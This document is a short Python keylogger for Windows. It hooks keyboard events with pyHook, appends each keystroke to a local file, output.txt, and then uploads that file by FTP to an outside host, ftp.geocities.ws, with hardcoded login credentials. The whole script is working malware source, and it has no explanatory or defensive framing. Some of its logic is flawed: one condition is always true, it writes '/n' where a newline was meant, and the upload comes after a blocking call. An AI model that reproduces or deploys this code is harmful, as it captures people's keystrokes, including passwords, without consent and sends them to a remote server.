import win32api
import win32console
import win32gui
import pythoncom,pyHook
import ftplib

f=open('output.txt','w')
f.close()
while True:

	def OnKeyboardEvent(event):
		if event.Ascii==5:
			exit(1)
		if event.Ascii !=0 or 8:
			f=open('output.txt','r+')
			buffer=f.read()
			f.close()
			f=open('output.txt','w')
			keylogs=chr(event.Ascii)
			if event.Ascii==13:
				keylogs='/n'
			buffer+=keylogs
			f.write(buffer)
			f.close()
	hm=pyHook.HookManager()
	hm.KeyDown=OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()
	session = ftplib.FTP('ftp.geocities.ws','sefgfaulted','wepartyrock')
	session.cwd("fah")
	file=open('output.txt','rb')
	session.storbinary('STOR output.txt', file)     
	file.close()
	session.quit()